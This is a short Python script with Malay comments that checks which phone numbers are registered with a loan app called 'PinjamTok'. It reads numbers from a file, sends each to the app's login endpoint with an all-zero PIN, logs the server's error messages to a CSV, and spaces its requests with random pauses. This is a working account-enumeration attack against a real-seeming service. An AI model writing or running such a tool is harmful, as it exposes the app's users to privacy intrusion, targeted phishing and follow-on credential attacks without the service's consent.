#!/usr/bin/env python3
"""Kesan nombor berdaftar PinjamTok. Guna: python3 semak_nombor.py nombor.txt"""
import json, sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from lib.http import post
from lib.util import normal, jeda

CFG = json.load(open("config.json"))["pinjamtok"]
URL = CFG["base"] + CFG["login"]
PIN = "0" * (CFG["pin_length"] or 6)


def main():
    hasil = []
    for baris in open(sys.argv[1], encoding="utf-8"):
        tel = baris.strip()
        if not tel or tel.startswith("#"):
            continue
        tel = normal(tel)
        st, j = post(URL, {CFG["login_fields"][0]: tel, CFG["login_fields"][1]: PIN})
        pesan = (j.get("error") or j.get("message") or j.get("detail") or "").replace('"', "'")
        print(f"{tel}  HTTP {st}  {pesan}")
        hasil.append((tel, st, pesan))
        jeda(0.4, 0.8)

    with open("semakan.csv", "w", encoding="utf-8-sig") as f:
        f.write("telefon,http,mesej\n")
        for t, s, p in hasil:
            f.write(f'{t},{s},"{p}"\n')
    print("\n-> semakan.csv")


if __name__ == "__main__":
    main()